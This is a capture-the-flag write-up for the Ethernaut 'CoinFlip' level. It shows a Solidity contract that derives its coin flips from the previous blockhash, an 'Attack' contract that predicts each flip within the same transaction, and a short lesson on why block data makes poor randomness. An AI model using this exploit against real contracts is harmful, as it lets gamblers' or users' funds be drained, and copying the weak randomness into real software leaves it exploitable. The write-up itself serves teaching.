## Challenge
~~~
This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

  Things that might help

- See the ["?"](https://ethernaut.openzeppelin.com/help) page above in the top right corner menu, section "Beyond the console"
~~~
## Contract
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```
`

## Solution

```
contract Attack {
    CoinFlip private immutable target;
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = CoinFlip(_target);
    }

    // call this function 10 times
    function flip() external {
        bool guess = _guess();
        require(target.flip(guess), "guess failed");
    }

    function _guess() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1 ? true : false;
    }
}
```

## Key takeaways and useful resources

We cannot depend on the `block.number` when we need a completely random value even more when there is money at stake. Block number can be accessed by everyone making it vulnerable for random number generation because they become very deterministic. Not only can it be accessed by everyone but it be tampered with by the block producers (The validators) depending on the chain. When we make a call to our Attack contract it will create a nested call to the vulnerable contract and these both calls would be part of the same transaction and this way they will be part of the same block.

[Transactions explained](https://ethereum.org/en/developers/docs/transactions/)
[Block properties](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#block-and-transaction-properties)


